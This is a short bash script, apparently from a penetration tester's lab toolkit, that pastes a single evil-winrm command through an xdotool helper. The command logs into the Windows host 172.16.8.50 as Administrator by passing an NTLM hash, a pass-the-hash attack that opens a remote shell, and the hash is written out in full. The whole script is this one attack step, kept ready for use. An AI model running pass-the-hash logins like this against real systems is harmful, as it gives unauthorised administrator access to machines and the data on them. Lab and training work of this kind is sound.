#!/bin/bash

: '
Connect with Evil-WinRM as Administrator using NTLM hash.
'

source ~/Desktop/base/code/xdotool/helpers/paste_commands.sh

paste_command "evil-winrm -i 172.16.8.50 -u 'Administrator' -H '0e20798f695ab0d04bc138b22344cea8'"